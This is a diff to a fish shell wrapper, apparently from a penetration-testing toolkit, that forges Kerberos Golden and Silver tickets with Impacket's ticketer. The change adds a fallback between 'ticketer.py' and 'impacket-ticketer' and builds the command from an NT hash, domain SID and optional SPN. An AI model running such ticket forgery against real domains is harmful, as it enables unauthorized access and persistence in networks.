@@ -43,12 +43,17 @@ function _kronos_ticket --description "Create Golden and Silver Tickets using ti
         set target_user $_flag_user
     end
 
-    if not command -s impacket-ticketer >/dev/null
-        echo "Error: impacket-ticketer not found in PATH." >&2
+    set -l impacket_cmd ""
+    if command -s ticketer.py >/dev/null
+        set impacket_cmd "ticketer.py"
+    else if command -s impacket-ticketer >/dev/null
+        set impacket_cmd "impacket-ticketer"
+    else
+        echo "Error: ticketer.py or impacket-ticketer not found in PATH." >&2
         return 1
     end
 
-    set -l cmd_str "impacket-ticketer -nthash $_flag_hash -domain-sid $_flag_sid -domain $domain"
+    set -l cmd_str "$impacket_cmd -nthash $_flag_hash -domain-sid $_flag_sid -domain $domain"
 
     if set -q _flag_spn
         set cmd_str "$cmd_str -spn $_flag_spn"
